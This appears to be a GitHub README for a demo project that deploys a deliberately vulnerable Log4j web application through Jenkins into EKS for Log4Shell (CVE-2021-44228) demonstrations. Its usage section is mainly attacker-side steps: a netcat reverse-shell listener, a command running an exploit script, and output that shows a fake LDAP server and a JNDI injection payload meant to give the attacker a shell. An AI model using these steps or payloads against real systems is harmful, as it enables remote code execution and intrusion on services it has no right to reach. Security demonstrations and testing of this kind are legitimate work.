# cicd-log4j
Building and deploying an exploitable web containerized application with Log4j on Jenkins into EKS.

For PoC/demo purpose only

<img width="901" alt="image" src="https://github.com/user-attachments/assets/a05f6889-852d-41e4-a40a-222002928c2c" />

Based on https://github.com/kozmer/log4j-shell-poc


#### Usage:

Deploy the application:

![image](https://github.com/user-attachments/assets/4d8d385d-f79b-4fa8-b9b8-857eac7af333)

From the attacker machine:

* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>
